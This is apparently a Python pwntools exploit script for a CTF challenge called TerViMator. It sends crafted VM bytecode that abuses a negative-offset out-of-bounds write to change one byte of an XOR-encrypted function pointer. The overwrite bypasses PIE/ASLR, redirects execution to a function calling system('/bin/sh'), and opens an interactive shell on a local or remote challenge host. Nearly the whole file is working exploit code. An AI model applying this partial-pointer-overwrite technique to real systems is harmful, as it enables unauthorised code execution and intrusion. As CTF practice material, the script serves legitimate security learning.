#!/usr/bin/env python3
"""
TerViMator - ASLR-aware Exploit
Pragyan CTF 2026

Strategy: Single-byte pointer modification bypasses PIE/ASLR
1. Create exec object (syscall 2, task=0) → obj 0 with encrypted ping pointer
2. Create data object (syscall 1) → obj 1 (writable)
3. Use write_byte negative offset from obj 1 to modify byte 0 of obj 0's pointer
   - Changes encrypted(ping@0x1283) → encrypted(escalation@0x129d)
   - Only byte 0 differs because PIE base is page-aligned (low 12 bits = 0)
4. Execute obj 0 (syscall 8) → calls escalation → system("/bin/sh")

Object layout (0x18 bytes each, array at 0x5040):
  obj 0: 0x5040  (perms@0x5048, flags@0x5049, func_ptr@0x5050)
  obj 1: 0x5058  (perms@0x5060, flags@0x5061, data_ptr@0x5068)

write_byte(obj_1, offset) writes to: 0x5068 + offset
  offset = -0x18 → 0x5050 (obj 0's func_ptr byte 0)
"""
from pwn import *

# === CONFIG ===
BINARY = "./chal"
HOST = "tervimator.ctf.prgy.in"
PORT = 1337

context.log_level = 'info'

# XOR key byte 0 (least significant byte of 0x1a5bfe810dce5825)
XOR_KEY_BYTE0 = 0x25

# Function offsets in binary
PING_OFFSET = 0x1283      # default function for syscall 2
ESCALATION_OFFSET = 0x129d # target: system("/bin/sh")

# Encrypted byte 0 values (only byte that differs due to page-aligned PIE base)
ENCRYPTED_PING_BYTE0 = (PING_OFFSET & 0xFF) ^ XOR_KEY_BYTE0       # 0x83 ^ 0x25 = 0xa6
ENCRYPTED_ESCALATION_BYTE0 = (ESCALATION_OFFSET & 0xFF) ^ XOR_KEY_BYTE0  # 0x9d ^ 0x25 = 0xb8

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True)
    elif args.GDB:
        return gdb.debug(BINARY, gdbscript='b *main\ncontinue\n')
    else:
        return process(BINARY)

def build_bytecode():
    bc = b''

    # Step 1: Create exec object (syscall 2, task=0) → obj 0
    # Result: perms=0x04 (exec), flags=0x02, encrypted ptr to ping
    bc += p8(1) + p8(0) + p32(2)      # SET_REG(0, 2) - syscall create_complex
    bc += p8(1) + p8(1) + p32(0)      # SET_REG(1, 0) - task=0 → ping (default)
    bc += p8(6)                        # SYSCALL → creates obj 0

    # Step 2: Create data object (syscall 1) → obj 1
    # Result: perms=0x03 (read+write), flags=0x01
    bc += p8(1) + p8(0) + p32(1)      # SET_REG(0, 1) - syscall alloc_data
    bc += p8(1) + p8(1) + p32(0x100)  # SET_REG(1, 0x100) - size=256
    bc += p8(6)                        # SYSCALL → creates obj 1

    # Step 3: Modify byte 0 of obj 0's encrypted pointer via negative offset
    # write_byte base for obj 1 = 0x5040 + 1*0x18 + 0x10 = 0x5068
    # Target: obj 0's func_ptr byte 0 at 0x5050
    # Offset needed: 0x5050 - 0x5068 = -0x18 = 0xFFFFFFE8 (32-bit)
    bc += p8(1) + p8(0) + p32(6)              # SET_REG(0, 6) - syscall write_byte
    bc += p8(1) + p8(1) + p32(1)              # SET_REG(1, 1) - obj_id=1
    bc += p8(1) + p8(2) + p32(0xFFFFFFE8)     # SET_REG(2, -0x18) - negative offset
    bc += p8(1) + p8(3) + p32(ENCRYPTED_ESCALATION_BYTE0)  # SET_REG(3, 0xb8)
    bc += p8(6)                                # SYSCALL → changes ping→escalation

    # Step 4: Execute obj 0 → decrypts to escalation → system("/bin/sh")
    bc += p8(1) + p8(0) + p32(8)      # SET_REG(0, 8) - syscall call_function
    bc += p8(1) + p8(1) + p32(0)      # SET_REG(1, 0) - obj_id=0
    bc += p8(6)                        # SYSCALL → shell!

    # No EXIT opcode - escalation calls exit(0) after shell closes
    return bc

def exploit():
    io = get_process()

    bytecode = build_bytecode()
    log.info(f"Bytecode: {len(bytecode)} bytes")
    log.info(f"Encrypted ping byte 0: {hex(ENCRYPTED_PING_BYTE0)} → escalation: {hex(ENCRYPTED_ESCALATION_BYTE0)}")

    # Wait for full prompt then send bytecode
    io.recvuntil(b'bytecode...\n', timeout=5)
    io.send(bytecode)

    # Interactive shell
    io.interactive()

if __name__ == "__main__":
    exploit()

